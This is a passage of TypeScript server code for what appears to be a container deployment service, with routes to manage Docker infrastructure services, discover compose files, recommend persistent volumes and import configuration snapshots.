          const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
          await worktreeService.remove(repoRoot, entry.worktreePath);
        } catch { /* ok */ }
        } catch (err) {
          branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
          throw err;
        } finally {
          completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
        }
      }

      // 2. Stop and remove all infra service containers (volumes preserved)
      for (const svc of state.infraServices) {
        sendSSE(res, 'step', { step: 'reset', status: 'running', title: `停止基础设施 ${svc.name}...` });
        try {
          await containerService.remove(svc.containerName, {
            projectId: svc.projectId,
            serviceId: svc.id,
            requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
            actor: resolveActorFromRequest(req),
            trigger: 'factory-reset',
            operation: 'factory-reset-global-infra',
            source: 'api.factory-reset',
            reason: `全局恢复出厂设置时停止基础设施 ${svc.name}`,
          });
        } catch { /* ok */ }
      }

      // 3. Clear all state (but keep the file — it will be overwritten with defaults)
      const freshState: typeof state = {
        routingRules: [],
        buildProfiles: [],
        branches: {},
        nextPortIndex: 0,
        logs: {},
        defaultBranch: null,
        customEnv: { _global: {} },
        infraServices: [],
      };
      Object.assign(state, freshState);
      stateService.save();

      sendSSE(res, 'complete', {
        message: `已恢复出厂设置：清除 ${branches.length} 个分支、${state.infraServices.length} 个基础设施服务、所有配置。Docker 数据卷已保留。`,
      });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Compose-based infrastructure service discovery ──

  /**
   * Convert a ComposeServiceDef to an InfraService (allocating a host port).
   * PR_B.1：projectId 改为必填，所有 caller 必须显式传入。
   */
  function composeDefToInfraService(def: ComposeServiceDef, projectId: string): InfraService {
    const hostPort = stateService.allocatePort(config.portStart);
    return {
      id: def.id,
      projectId,
      name: def.name,
      dockerImage: def.dockerImage,
      containerPort: def.containerPort,
      hostPort,
      containerName: `cds-infra-${def.id}`,
      status: 'stopped',
      volumes: [...def.volumes],
      env: { ...def.env },
      healthCheck: def.healthCheck ? { ...def.healthCheck } : undefined,
      // 2026-05-28:命令/入口透传,修 minio 缺 cmd 灾难
      ...(def.command !== undefined ? { command: def.command } : {}),
      ...(def.entrypoint !== undefined ? { entrypoint: def.entrypoint } : {}),
      createdAt: new Date().toISOString(),
    };
  }

  // ── Infrastructure services CRUD ──

  router.get('/infra', async (req, res) => {
    // P4 Part 3b: optional ?project=<id> filter.
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const live = req.query.live === 'true' || req.query.live === '1';
    const services = projectFilter
      ? stateService.getInfraServicesForProject(projectFilter)
      : stateService.getInfraServices();

    // Reconcile status with Docker
    if (live) {
      for (const svc of services) {
        if (svc.status === 'running') {
          const running = await containerService.isRunning(svc.containerName);
          if (!running) {
            svc.status = 'stopped';
          }
        }
      }
      stateService.save();
    }

    res.json({ services });
  });

  // Infra catalog (SSOT: services/infra-catalog.ts) — secret-free preset list for the
  // visual picker. The frontend reads this instead of hard-coding images/ports/env names,
  // so adding a new infra type to the catalog auto-surfaces it in the UI.
  router.get('/infra/catalog', (_req, res) => {
    res.json({ catalog: getInfraCatalogPublic() });
  });

  // Discover infrastructure services from compose files in the project repo
  router.get('/infra/discover', (req, res) => {
    try {
      // Scope discovery to the current project's own repo root only.
      // Using config.repoRoot (the CDS host directory) would expose compose
      // files belonging to other projects.
      const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
      const effectiveProjectId = queryProject || 'default';
      const scanRoot = stateService.getProjectRepoRoot(effectiveProjectId, config.repoRoot);

      const composeFiles = discoverComposeFiles(scanRoot);
      const discovered: { file: string; services: ComposeServiceDef[] }[] = [];

      for (const file of composeFiles) {
        try {
          const services = parseComposeFile(file);
          if (services.length > 0) {
            discovered.push({ file: path.relative(scanRoot, file), services });
          }
        } catch { /* skip unparseable files */ }
      }

      res.json({ discovered });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  /**
   * Resolve the project context for /infra/:id routes.
   *
   * Reads ?project=<id> from the query string first. If absent, and the
   * global lookup of `id` yields exactly one match, uses that match's
   * projectId (back-compat for clients that don't know about projects).
   * If the global lookup yields multiple matches across projects,
   * returns null so the caller can 400 with a clear "which project?"
   * message instead of silently operating on the wrong one.
   */
  function resolveInfraProject(req: Request, id: string): { projectId: string } | { ambiguous: string[] } | null {
    const q = typeof req.query.project === 'string' ? req.query.project : null;
    if (q) return { projectId: q };
    const all = stateService.getInfraServices().filter(s => s.id === id);
    if (all.length === 0) return null;
    if (all.length === 1) return { projectId: all[0].projectId || 'default' };
    // Bug I (LOW, 2026-05-10): when ?project= is missing AND the id exists
    // in multiple projects, try to disambiguate from the Referer header so
    // that POST /api/infra/mysql/restart issued from
    //   https://cds.miduo.org/projects/<projId>/...
    // resolves to the project the user is currently viewing instead of
    // unconditionally erroring with "exists in multiple projects".
    const referer = (req.headers.referer || (req.headers as any).referrer) as string | undefined;
    if (referer) {
      const m = /\/projects\/([^/?#]+)/.exec(referer);
      if (m && m[1]) {
        const refProj = decodeURIComponent(m[1]);
        const hit = all.find(s => (s.projectId || 'default') === refProj);
        if (hit) return { projectId: hit.projectId || 'default' };
      }
    }
    // Bug I fallback 2: also accept an X-CDS-Project header set by the
    // SPA — same idea as the referer parse but explicit for fetch()
    // callers that don't always set Referer.
    const hdr = req.headers['x-cds-project'] as string | string[] | undefined;
    const hdrProj = Array.isArray(hdr) ? hdr[0] : hdr;
    if (hdrProj) {
      const hit = all.find(s => (s.projectId || 'default') === hdrProj);
      if (hit) return { projectId: hit.projectId || 'default' };
    }
    return { ambiguous: all.map(s => s.projectId || 'default') };
  }

  /**
   * Bug Q (HIGH, 2026-05-10): default volume recommendations per infra image.
   *
   * Background: previously POST /api/infra defaulted `volumes:[]` when the
   * caller didn't pass any. For stateful services (mysql, postgres, redis,
   * nacos, ...) this means `restart` wipes the data dir on every container
   * recreate — a real-world incident where mytapd's MySQL was zeroed out
   * because nobody noticed the empty volume default.
   *
   * The recommended-volumes table maps image-name prefixes to the canonical
   * data dir(s) inside the container. If the caller didn't supply volumes,
   * we auto-fill from this table. Callers who explicitly pass `volumes:[]`
   * (i.e. the field is present and an empty array) keep stateless behaviour
   * but the response includes a `warning` so the operator-driven UI can
   * surface the data-loss risk.
   */
  function recommendedVolumePathsForImage(image: string): string[] | null {
    const lower = (image || '').toLowerCase();
    const baseRaw = lower.split('/').pop() || lower;
    const base = baseRaw.split(':')[0];
    if (base.startsWith('mysql') || base.startsWith('mariadb')) return ['/var/lib/mysql'];
    if (base.startsWith('postgres')) return ['/var/lib/postgresql/data'];
    if (base.startsWith('redis')) return ['/data'];
    if (base.startsWith('nacos')) return ['/home/nacos/data', '/home/nacos/conf'];
    if (base.startsWith('rabbitmq')) return ['/var/lib/rabbitmq'];
    if (base.startsWith('mongo')) return ['/data/db'];
    if (base.startsWith('elasticsearch') || base.startsWith('opensearch')) return ['/usr/share/elasticsearch/data'];
    return null;
  }
  function recommendedInfraVolumes(infraId: string, image: string): InfraVolume[] | null {
    const paths = recommendedVolumePathsForImage(image);
    if (!paths) return null;
    return paths.map((p, idx) => ({
      // Stable named-volume slug per (infraId, mount-suffix) so the same
      // path always re-binds across restarts.
      name: `cds-${infraId}-data${idx === 0 ? '' : `-${idx + 1}`}`,
      containerPath: p,
      type: 'volume' as const,
    }));
  }

  router.post('/infra', async (req, res) => {
    try {
      const body = req.body as Partial<InfraService>;

      if (!body.id || !body.dockerImage || !body.containerPort) {
        res.status(400).json({ error: 'id、Docker 镜像和容器端口为必填项' });
        return;
      }
      const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
      const projectId = body.projectId || queryProject || 'default';
      const targetProject = stateService.getProject(projectId);
      if (!targetProject) {
        res.status(400).json({ error: `未知项目: ${projectId}` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      const hostPort = stateService.allocatePort(config.portStart, await collectListeningPorts(shell));
      // Container name must be globally unique in Docker. Legacy project
      // keeps the bare `cds-infra-<id>` format for back-compat (existing
      // running containers match). Non-legacy projects get the project
      // slug head prefixed so two projects can each own `mongodb`.
      const containerName = targetProject.legacyFlag
        ? `cds-infra-${body.id}`
        : `cds-infra-${targetProject.slug.slice(0, 12)}-${body.id}`;

      // Bug Q: when caller omits `volumes`, auto-fill recommended data
      // dirs for known stateful images. Empty array passed explicitly is
      // honoured (operator opt-out) but we attach a warning.
      let volumes: InfraVolume[];
      let volumeWarning: string | null = null;
      const recommended = recommendedInfraVolumes(body.id, body.dockerImage);
      const recommendedPaths = recommendedVolumePathsForImage(body.dockerImage);
      if (body.volumes === undefined || body.volumes === null) {
        volumes = recommended ? recommended : [];
      } else if (Array.isArray(body.volumes) && body.volumes.length === 0 && recommended) {
        volumes = [];
        volumeWarning = `image ${body.dockerImage} 通常需要持久化卷 (${(recommendedPaths || []).join(', ')})，当前 volumes:[] 在 restart 时会清零数据。如确认无状态可忽略。`;
      } else {
        volumes = body.volumes;
      }

      const service: InfraService = {
        id: body.id,
        projectId,
        name: body.name || body.id,
        dockerImage: body.dockerImage,
        containerPort: body.containerPort,
        hostPort,
        containerName,
        status: 'stopped',
        volumes,
        env: body.env || {},
        healthCheck: body.healthCheck,
        // 2026-05-28:手工 POST /api/infra 也支持 command/entrypoint
        ...(body.command !== undefined ? { command: body.command } : {}),
        ...(body.entrypoint !== undefined ? { entrypoint: body.entrypoint } : {}),
        // Cursor Bugbot(PR #684):在存储边界就 sanitize restartPolicy,而不是只
        // 依赖 container.ts 在 docker run 时 sanitize。否则未校验的值留在 state.json,
        // 任何未来读 service.restartPolicy 的代码路径(如 diffSignatures 直接比对)
        // 都可能忘记 sanitize 而把注入串带进 shell。纵深防御:存进去的就是合法值。
        ...(typeof body.restartPolicy === 'string'
          ? { restartPolicy: sanitizeDockerRestartPolicy(body.restartPolicy) }
          : {}),
        createdAt: new Date().toISOString(),
      };

      stateService.addInfraService(service);
      stateService.save();

      res.status(201).json(volumeWarning ? { service, warning: volumeWarning } : { service });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.put('/infra/:id', (req, res) => {
    try {
      const updates = req.body as Partial<InfraService>;
      const resolved = resolveInfraProject(req, req.params.id);
      if (!resolved) { res.status(404).json({ error: `基础设施服务 "${req.params.id}" 不存在` }); return; }
      if ('ambiguous' in resolved) {
        res.status(400).json({ error: `基础设施服务 "${req.params.id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
        return;
      }
      {
        const m = assertProjectAccess(req as any, resolved.projectId);
        if (m) { res.status(m.status).json(m.body); return; }
      }
      stateService.updateInfraService(req.params.id, updates, resolved.projectId);
      stateService.save();
      res.json({ message: '已更新' });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/infra/:id', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      try { await containerService.stopInfraService(service.containerName); } catch { /* ok */ }
      stateService.removeInfraService(id, resolved.projectId);
      stateService.save();
      res.json({ message: `已删除基础设施服务 "${id}"` });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/infra/:id/start', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      const started = await startInfraWithPortRetry(service, resolved.projectId);
      stateService.updateInfraService(id, { hostPort: started.hostPort, status: 'running', errorMessage: undefined }, resolved.projectId);
      stateService.save();
      res.json({ message: `基础设施服务 "${id}" 已启动`, service: stateService.getInfraServiceForProjectAndId(resolved.projectId, id) });
    } catch (err) {
      stateService.updateInfraService(id, { status: 'error', errorMessage: (err as Error).message }, resolved.projectId);
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/infra/:id/stop', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      await containerService.stopInfraService(service.containerName);
      stateService.updateInfraService(id, { status: 'stopped' }, resolved.projectId);
      stateService.save();
      res.json({ message: `基础设施服务 "${id}" 已停止` });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.post('/infra/:id/restart', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const m = assertProjectAccess(req as any, resolved.projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      try { await containerService.stopInfraService(service.containerName); } catch { /* ok */ }
      const started = await startInfraWithPortRetry(service, resolved.projectId);
      stateService.updateInfraService(id, { hostPort: started.hostPort, status: 'running', errorMessage: undefined }, resolved.projectId);
      stateService.save();
      res.json({ message: `基础设施服务 "${id}" 已重启`, service: stateService.getInfraServiceForProjectAndId(resolved.projectId, id) });
    } catch (err) {
      stateService.updateInfraService(id, { status: 'error', errorMessage: (err as Error).message }, resolved.projectId);
      stateService.save();
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/infra/:id/logs', async (req, res) => {
    const { id } = req.params;
    const resolved = resolveInfraProject(req, id);
    if (!resolved) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    if ('ambiguous' in resolved) {
      res.status(400).json({ error: `基础设施服务 "${id}" 在多个项目存在 (${resolved.ambiguous.join(', ')})，请带 ?project=<id>` });
      return;
    }
    const service = stateService.getInfraServiceForProjectAndId(resolved.projectId, id);
    if (!service) { res.status(404).json({ error: `基础设施服务 "${id}" 不存在` }); return; }
    try {
      const logs = await containerService.getLogs(service.containerName);
      res.json({ logs });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/infra/:id/health', async (req, res) => {
    const { id } = req.params;
    const service = stateService.getInfraService(id);
    if (!service) {
      res.status(404).json({ error: `基础设施服务 "${id}" 不存在` });
      return;
    }
    try {
      const health = await containerService.getInfraHealth(service.containerName);
      res.json({ health });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // Quick setup: discover infra from compose files and start them
  router.post('/infra/quickstart', async (req, res) => {
    const { compose: composeYaml, serviceIds } = req.body as { compose?: string; serviceIds?: string[] };
    const results: { id: string; status: string; error?: string }[] = [];

    // PR_B.1：projectId 提到外层使 composeDefToInfraService(def, effectiveProjectId)
    // 在 for 循环里能访问到。两个分支（compose 和 auto-discover）都需要它。
    const queryProject = typeof req.query.project === 'string' ? req.query.project : null;
    const bodyProject = typeof req.body.projectId === 'string' ? req.body.projectId : null;
    const effectiveProjectId =
      queryProject || bodyProject || stateService.getLegacyProject()?.id || 'default';

    // Resolve service definitions: from inline compose YAML, or auto-discover from repo
    let defs: ComposeServiceDef[] = [];
    if (composeYaml) {
      defs = parseComposeString(composeYaml);
    } else {
      // Scope discovery to the current project's repo root only.
      // Using config.repoRoot (the shared CDS host dir) would expose compose
      // files from other projects — same isolation fix as /infra/discover.
      const scanRoot = stateService.getProjectRepoRoot(effectiveProjectId, config.repoRoot);
      const composeFiles = discoverComposeFiles(scanRoot);
      const seenIds = new Set<string>();
      for (const file of composeFiles) {
        try {
          for (const def of parseComposeFile(file)) {
            if (!seenIds.has(def.id)) {
              seenIds.add(def.id);
              defs.push(def);
            }
          }
        } catch { /* skip */ }
      }
    }

    // Filter by requested IDs if specified
    if (serviceIds && serviceIds.length > 0) {
      defs = defs.filter(d => serviceIds.includes(d.id));
    }

    if (defs.length === 0) {
      res.json({ results: [], message: '未找到基础设施服务定义。请在项目中添加 docker-compose.yml 或 cds-compose.yml 文件。' });
      return;
    }

    for (const def of defs) {
      // Skip if already exists
      if (stateService.getInfraService(def.id)) {
        results.push({ id: def.id, status: 'exists' });
        continue;
      }

      const service = composeDefToInfraService(def, effectiveProjectId);

      try {
        stateService.addInfraService(service);
        // Phase 1: 传项目 customEnv 让 ${VAR} 展开
        await containerService.startInfraService(service, stateService.getCustomEnv(effectiveProjectId));
        stateService.updateInfraService(service.id, { status: 'running' });
        results.push({ id: service.id, status: 'started' });
      } catch (err) {
        stateService.updateInfraService(service.id, { status: 'error', errorMessage: (err as Error).message });
        results.push({ id: service.id, status: 'error', error: (err as Error).message });
      }
    }

    stateService.save();
    res.json({ results });
  });

  // ── Config Import / Export ──

  /** Validate a CDS Config JSON blob */
  function validateConfigBlob(blob: unknown): { valid: boolean; errors: string[]; warnings: string[] } {
    const errors: string[] = [];
    const warnings: string[] = [];
    if (!blob || typeof blob !== 'object') {
      return { valid: false, errors: ['配置必须是一个 JSON 对象'], warnings };
    }
    const cfg = blob as Record<string, unknown>;
    const schema = cfg.$schema as string | undefined;
    if (schema && schema !== 'cds-config') {
      errors.push('$schema 字段值应为 "cds-config"');
    }
    // Validate buildProfiles
    if (cfg.buildProfiles !== undefined) {
      if (!Array.isArray(cfg.buildProfiles)) {
        errors.push('buildProfiles 必须是数组');
      } else {
        for (let i = 0; i < cfg.buildProfiles.length; i++) {
          const p = cfg.buildProfiles[i] as Record<string, unknown>;
          if (!p.id) errors.push(`buildProfiles[${i}]: 缺少 id`);
          if (!p.name) errors.push(`buildProfiles[${i}]: 缺少 name`);
          if (!p.dockerImage) errors.push(`buildProfiles[${i}]: 缺少 dockerImage`);
          if (!p.command) errors.push(`buildProfiles[${i}]: 缺少 command`);
          if (p.containerPort !== undefined) {
            const port = Number(p.containerPort);
            if (!Number.isInteger(port) || port < 1 || port > 65535) {
              errors.push(`buildProfiles[${i}]: containerPort 必须在 1-65535 之间`);
            }
          }
          // Check corepack prefix for pnpm/yarn commands
          const label = `buildProfiles[${i}]`;
          const cmdWarn = checkCorepackPrefix(p.command as string | undefined, `${label}.command`);
          if (cmdWarn) warnings.push(cmdWarn);

          // Cross-check: if workDir has a lock file that doesn't match the command's PM
          if (p.workDir && typeof p.workDir === 'string') {
            const fullDir = path.join(config.repoRoot, p.workDir);
            if (fs.existsSync(fullDir)) {
              const detectedPm = detectPackageManager(fullDir);
              const cmdToCheck = (p.command as string) || '';
              const usesWrongPm =
                (detectedPm === 'pnpm' && /\bnpm install\b/.test(cmdToCheck)) ||
                (detectedPm === 'npm' && /\bpnpm install\b/.test(cmdToCheck)) ||
                (detectedPm === 'yarn' && !/\byarn install\b/.test(cmdToCheck) && /\b(npm|pnpm) install\b/.test(cmdToCheck));
              if (usesWrongPm) {
                warnings.push(`${label}: 检测到 ${p.workDir}/ 使用 ${detectedPm}，但命令使用了其他包管理器`);
              }
            }
          }
        }
      }
    }
    // Validate envVars
    if (cfg.envVars !== undefined && (typeof cfg.envVars !== 'object' || Array.isArray(cfg.envVars))) {
      errors.push('envVars 必须是键值对对象');
    }
    // Validate infraServices — accepts array of full definitions OR a compose YAML string
    if (cfg.infraServices !== undefined) {
      if (typeof cfg.infraServices === 'string') {
        // Compose YAML string — validate it parses
        try {
          const defs = parseComposeString(cfg.infraServices as string);
          if (defs.length === 0) {
            warnings.push('infraServices (compose YAML): 未解析到任何服务');
          }
        } catch (e) {
          errors.push(`infraServices (compose YAML): 解析失败 — ${(e as Error).message}`);
        }
      } else if (Array.isArray(cfg.infraServices)) {
        for (let i = 0; i < cfg.infraServices.length; i++) {
          const s = cfg.infraServices[i] as Record<string, unknown>;
          if (!s.id) {
            errors.push(`infraServices[${i}]: 缺少 id`);
          }
          if (!s.dockerImage && !s.image) {
            errors.push(`infraServices[${i}]: 缺少 dockerImage`);
          }
          if (!s.containerPort) {
            errors.push(`infraServices[${i}]: 缺少 containerPort`);
          }
        }
      } else {
        errors.push('infraServices 必须是数组或 compose YAML 字符串');
      }
    }
    // Validate routingRules
    if (cfg.routingRules !== undefined) {
      if (!Array.isArray(cfg.routingRules)) {
        errors.push('routingRules 必须是数组');
      }
    }
    return { valid: errors.length === 0, errors, warnings };
  }

  /** Resolve infraServices from config — supports array of full defs or compose YAML string */
  function resolveInfraDefs(cfg: Record<string, unknown>): ComposeServiceDef[] {
    if (!cfg.infraServices) return [];

    if (typeof cfg.infraServices === 'string') {
      return parseComposeString(cfg.infraServices as string);
    }

    if (Array.isArray(cfg.infraServices)) {
      return (cfg.infraServices as Array<Record<string, unknown>>).map(s => ({
        id: (s.id as string) || '',
        name: (s.name as string) || (s.id as string) || '',
        dockerImage: (s.dockerImage as string) || (s.image as string) || '',
        containerPort: (s.containerPort as number) || 0,
        volumes: (s.volumes as Array<{ name: string; containerPath: string }>) || [],
        env: (s.env as Record<string, string>) || {},
        healthCheck: s.healthCheck as ComposeServiceDef['healthCheck'],
      }));
    }

    return [];
  }

  /** Preview what an import would do (without applying) */
  function previewImport(cfg: Record<string, unknown>) {
    const summary = {
      buildProfiles: { add: 0, replace: 0, skip: 0, items: [] as string[] },
      envVars: { add: 0, replace: 0, items: [] as string[] },
      infraServices: { add: 0, skip: 0, items: [] as string[] },
      routingRules: { add: 0, replace: 0, items: [] as string[] },
    };

    if (Array.isArray(cfg.buildProfiles)) {
      for (const p of cfg.buildProfiles as Array<{ id: string; name?: string }>) {
        const existing = stateService.getBuildProfile(p.id);
        if (existing) {
          summary.buildProfiles.replace++;
          summary.buildProfiles.items.push(`替换: ${p.name || p.id}`);
        } else {
          summary.buildProfiles.add++;
          summary.buildProfiles.items.push(`新增: ${p.name || p.id}`);
        }
      }
    }

    if (cfg.envVars && typeof cfg.envVars === 'object') {
      const currentEnv = stateService.getCustomEnv();
      for (const key of Object.keys(cfg.envVars as Record<string, string>)) {
        if (key in currentEnv) {
          summary.envVars.replace++;
          summary.envVars.items.push(`覆盖: ${key}`);
        } else {
          summary.envVars.add++;
          summary.envVars.items.push(`新增: ${key}`);
        }
      }
    }

    // Resolve infra services from array or compose YAML string
    const infraDefs = resolveInfraDefs(cfg);
    for (const def of infraDefs) {
      const existing = stateService.getInfraService(def.id);
      if (existing) {
        summary.infraServices.skip++;
        summary.infraServices.items.push(`跳过 (已存在): ${def.id}`);
      } else {
        summary.infraServices.add++;
        summary.infraServices.items.push(`新增: ${def.name || def.id}`);
      }
    }

    if (Array.isArray(cfg.routingRules)) {
      for (const r of cfg.routingRules as Array<{ id: string; name?: string }>) {
        const existing = stateService.getRoutingRules().find(x => x.id === r.id);
        if (existing) {
          summary.routingRules.replace++;
          summary.routingRules.items.push(`替换: ${r.name || r.id}`);
        } else {
          summary.routingRules.add++;
          summary.routingRules.items.push(`新增: ${r.name || r.id}`);
        }
      }
    }

    return summary;
  }

  // POST /api/import-config — validate, preview, and optionally apply
  //
  // 2026-04-22 升级：
  //   - 每次 apply 前自动拍 ConfigSnapshot（trigger='pre-import'）
  //   - 新增 cleanMode: 'merge' | 'replace-all'
  //       merge      = 原行为（新增/更新，不删除存量）
  //       replace-all = 清空 buildProfiles/envVars/infra/routingRules 后再 apply
  //   - 新增 branchPolicy: 'keep' | 'restart-all' | 'clean'
  //       keep        = 不动运行中的分支（默认）
  //       restart-all = apply 后调度重启所有分支容器（让新 env 生效）
  //       clean       = 额外清掉所有分支的运行状态（容器 + worktree），只留配置
  //
  // 数据库永不在清理范围内。想清数据库走 /api/infra/:id/purge。
  router.post('/import-config', async (req, res) => {
    try {
      const {
        config: configBlob,
        dryRun,
        cleanMode = 'merge',
        branchPolicy = 'keep',
      } = req.body as {
        config: unknown;
        dryRun?: boolean;
        cleanMode?: 'merge' | 'replace-all';
        branchPolicy?: 'keep' | 'restart-all' | 'clean';
      };

      if (cleanMode !== 'merge' && cleanMode !== 'replace-all') {
        res.status(400).json({ error: `非法的 cleanMode: ${cleanMode}（允许 merge / replace-all）` });
        return;
      }
      if (!['keep', 'restart-all', 'clean'].includes(branchPolicy)) {
        res.status(400).json({ error: `非法的 branchPolicy: ${branchPolicy}（允许 keep / restart-all / clean）` });
        return;
      }

      // Auto-detect format: string → try CDS compose YAML, object → JSON config
      let cfg: Record<string, unknown>;
      if (typeof configBlob === 'string') {
        const cdsConfig = parseCdsCompose(configBlob);
        if (cdsConfig) {
          cfg = {
            $schema: 'cds-config',
            buildProfiles: cdsConfig.buildProfiles,
            envVars: cdsConfig.envVars,
            infraServices: cdsConfig.infraServices.length > 0 ? cdsConfig.infraServices : undefined,
            routingRules: cdsConfig.routingRules.length > 0 ? cdsConfig.routingRules : undefined,
          };
        } else {
          try {
            cfg = JSON.parse(configBlob);
          } catch {
            res.status(400).json({
              valid: false,
              errors: ['无法解析输入：既不是有效的 CDS Compose YAML（需包含 services 定义），也不是有效的 JSON'],
              warnings: [],
            });
            return;
          }
        }
      } else {
        cfg = configBlob as Record<string, unknown>;
      }

      const validation = validateConfigBlob(cfg);
      if (!validation.valid) {
        res.status(400).json({ valid: false, errors: validation.errors, warnings: validation.warnings });
        return;
      }
      const preview = previewImport(cfg);

      if (dryRun) {
        res.json({
          valid: true,
          preview,
          applied: false,
          warnings: validation.warnings,
          cleanMode,
          branchPolicy,
        });
        return;
      }

      // 1) 拍快照（replace-all 必须拍；merge 也默认拍，成本很低）
      const snapshotLabel = cleanMode === 'replace-all'
        ? `导入前（replace-all）· ${new Date().toLocaleString('zh-CN')}`
        : `导入前（merge）· ${new Date().toLocaleString('zh-CN')}`;
      const snapshot = stateService.createConfigSnapshot({
        trigger: 'pre-import',
        label: snapshotLabel,
      });

      // 2) replace-all 模式：清空四件套
      //    用「全部删除 + 逐个添加」方式，避免状态字段漂移
      if (cleanMode === 'replace-all') {
        // 清 buildProfiles
        for (const p of [...stateService.getBuildProfiles()]) {
          stateService.removeBuildProfile(p.id);
        }
        // 清 customEnv（所有 scope）
        stateService.clearAllCustomEnv();
        // 清 infraServices（但保留已创建的容器数据 —— 只是从 state 删记录）
        for (const svc of [...stateService.getInfraServices()]) {
          stateService.removeInfraService(svc.id);
        }
        // 清 routingRules
        for (const rule of [...stateService.getRoutingRules()]) {
          stateService.removeRoutingRule(rule.id);
        }
      }

      // 3) apply buildProfiles
      if (Array.isArray(cfg.buildProfiles)) {
        for (const p of cfg.buildProfiles as BuildProfile[]) {
          const existing = stateService.getBuildProfile(p.id);
          if (existing) {
            stateService.updateBuildProfile(p.id, p);
          } else {
            p.workDir = p.workDir || '.';
            p.containerPort = p.containerPort || 8080;
            stateService.addBuildProfile(p);
          }
        }
      }

      // 4) apply envVars
      if (cfg.envVars && typeof cfg.envVars === 'object') {
        const newVars = cfg.envVars as Record<string, string>;
        for (const [key, value] of Object.entries(newVars)) {
          stateService.setCustomEnvVar(key, value);
        }
      }

      // 5) apply infraServices
      // PR_B.1：/import-config 是历史全局端点没带 projectId — 兜底到 legacy
      // project，保证多项目时不变成孤儿。后续可在 body 加 projectId 字段。
      const importInfraProjectId =
        stateService.getLegacyProject()?.id ?? 'default';
      const infraResults: { id: string; status: string }[] = [];
      const infraDefs = resolveInfraDefs(cfg);
      for (const def of infraDefs) {
        if (stateService.getInfraService(def.id)) {
          infraResults.push({ id: def.id, status: 'exists' });
          continue;
        }
        if (def.id && def.dockerImage && def.containerPort) {
          const service = composeDefToInfraService(def, importInfraProjectId);
          stateService.addInfraService(service);
          infraResults.push({ id: service.id, status: 'created' });
        }
      }

      // 6) apply routingRules
      if (Array.isArray(cfg.routingRules)) {
        for (const r of cfg.routingRules as RoutingRule[]) {
          const existing = stateService.getRoutingRules().find(x => x.id === r.id);
          if (existing) {
            stateService.updateRoutingRule(r.id, r);
          } else {
            r.priority = r.priority ?? 0;
            r.enabled = r.enabled ?? true;
            stateService.addRoutingRule(r);
          }
        }
      }

      syncCdsConfig();
      stateService.save();

      // 7) branchPolicy: 只做调度侧的标记，真实 restart/clean 由调用方按返回提示触发（避免同步阻塞）
      const branchActions: string[] = [];
      if (branchPolicy !== 'keep') {
        const branches = stateService.getAllBranches();
        for (const b of branches) {
          branchActions.push(`${b.id}: ${branchPolicy === 'restart-all' ? '待重启' : '待清理'}`);
        }
      }

      // 8) replace-all 视为破坏性操作，记审计日志 + 关联 snapshotId
      if (cleanMode === 'replace-all') {
        stateService.recordDestructiveOp({
